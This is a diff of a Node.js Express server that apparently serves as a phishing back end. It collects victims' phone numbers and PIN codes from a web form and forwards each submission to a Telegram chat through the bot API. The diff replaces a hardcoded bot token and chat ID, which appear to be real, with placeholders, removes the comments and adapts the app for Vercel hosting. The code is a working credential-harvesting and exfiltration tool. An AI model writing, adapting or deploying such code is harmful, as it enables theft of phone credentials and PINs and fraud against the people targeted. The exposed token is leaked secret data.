@@ -4,26 +4,20 @@ import fetch from 'node-fetch';
 import path from 'path';
 import { fileURLToPath } from 'url';
 
-// Configuration
-const TELEGRAM_BOT_TOKEN = '7246291582:AAGDVmXvRKX_PdEug_XZ2-pKnXrkPMcS3k0';
-const TELEGRAM_CHAT_ID = '-4544953608';
-const PORT = 8000;
+const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
+const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
+const PORT = process.env.PORT || 8000;  // Vercel will use a dynamic port
 
-// Data storage for phone and PIN tracking
 const clientData = {};
 
-// Resolve `__dirname` in ES modules
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-// Initialize Express app
 const app = express();
 
-// Middleware
 app.use(bodyParser.json());
-app.use(express.static(path.join(__dirname, 'public'))); // Serve static files like `index.html`
+app.use(express.static(path.join(__dirname, 'public'))); // Ensure public folder is used for static content
 
-// CORS Middleware
 app.use((req, res, next) => {
   res.header("Access-Control-Allow-Origin", "*");
   res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
@@ -31,25 +25,20 @@ app.use((req, res, next) => {
   next();
 });
 
-// POST endpoint for handling phone number and PIN submissions
 app.post('/', async (req, res) => {
   const { phoneNumber, pinCode } = req.body;
 
   try {
-    // Handle phone number submission
     if (phoneNumber && !pinCode) {
       if (clientData[phoneNumber]) {
         return res.status(400).json({ error: "Phone number already submitted." });
       }
-
       clientData[phoneNumber] = { pin: null, state: 'waiting' };
-
       console.log(`Received phone number: ${phoneNumber}`);
       await sendTelegramMessage(`New Phone Number Submission:\nPhone Number: ${phoneNumber}`);
       return res.status(200).json({ status: "Phone number received. Waiting for PIN." });
     }
 
-    // Handle PIN code submission
     if (pinCode && !phoneNumber) {
       const waitingPhoneNumber = Object.keys(clientData).find(
         (key) => clientData[key].state === 'waiting' && clientData[key].pin === null
@@ -65,7 +54,6 @@ app.post('/', async (req, res) => {
       return res.status(200).json({ status: "PIN code received and sent to Telegram." });
     }
 
-    // If neither phoneNumber nor pinCode is valid
     res.status(400).json({ error: "Invalid data. Expected either phoneNumber or pinCode." });
   } catch (error) {
     console.error("Error handling POST request:", error);
@@ -73,7 +61,6 @@ app.post('/', async (req, res) => {
   }
 });
 
-// Helper function to send a message to Telegram
 async function sendTelegramMessage(message) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   const payload = { chat_id: TELEGRAM_CHAT_ID, text: message };
@@ -94,7 +81,7 @@ async function sendTelegramMessage(message) {
   }
 }
 
-// Start the server
-app.listen(PORT, () => {
-  console.log(`Server is running on http://localhost:${PORT}`);
-});
+// Vercel automatically handles serverless functions, so this won't work directly on Vercel.
+// You'd need to deploy this as a serverless function or use Vercel's built-in API routes.
+
+export default app;
